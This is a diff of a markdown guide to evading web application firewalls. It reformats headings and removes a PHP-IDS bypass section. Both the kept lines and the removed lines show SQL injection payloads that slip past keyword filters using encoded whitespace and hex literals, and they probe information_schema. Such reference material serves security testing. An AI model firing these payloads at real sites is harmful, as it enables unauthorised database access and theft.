@@ -1337,10 +1337,10 @@ Wanna detect WAFs? Lets see how.
     </tr>
 </table>
 
-## Evasion Techniques
+# Evasion Techniques
 Lets look at some methods of bypassing and evading WAFs.
 
-### Fuzzing/Bruteforcing:
+## Fuzzing/Bruteforcing:
 #### Method:  
 Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
 - Wordlists specifically for fuzzing - [Seclists Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing).
@@ -1358,13 +1358,15 @@ __Drawback:__
 - This method often fails. 
 - Many a times your IP will be blocked (temporarily/permanently).
 
-### Regex-Reversing:
-#### Method:
+## Regex-Reversing:
+### Method:
 - Most efficient method of bypassing WAFs.
 - Some WAFs rely upon matching the attack payloads with the signatures in their databases.
 - Payload matches the reg-ex the WAF triggers alarm.
 
 #### Techniques:
+
+__Scenario 1: SQL Injection__
 
 ##### • Step 1:
 __Keyword filer__: `and`, `or`, `union`  
@@ -1422,24 +1424,6 @@ __Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`,
 __Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)`
 - __Filtered Injection__: `1 || lpad(user,7,1)`
 - __Bypassed Injection__: `1%0b||%0blpad(user,7,1)`
-
----
-
-__PHP-IDS__ generally blocks input containing `=` or `(` or `'` following with any a string or integer e.g. `1 or 1=1`, `1 or '1'`, `1 or char(97)`. However, it can be bypassed using a statement that does not contain `=`, `(` or `'` symbols. 
-
-#### Scenario 1:
-- __Filtered Injection__: `1 or 1 = 1`
-- __Bypassed Injection__: `1 or 1`
-
-#### Scenario 2:
-- __Filtered injection__: `1 union select 1, table_name from information_schema.tables where table_name = 'users'`
-- __Filtered Injection__: `1 union select 1, table_name from information_schema.tables where table_name between 'a' and 'z'`
-- __Filtered Injection__: `1 union select 1, table_name from information_schema.tables where table_name between char(97) and char(122)`
-- __Bypassed Injection__: `1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7a`
-- __Bypassed Injection__: `1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273`
-
-__Drawbacks:__
-- This method is time consuming.
 
 ## Google Dorks Approach:
 
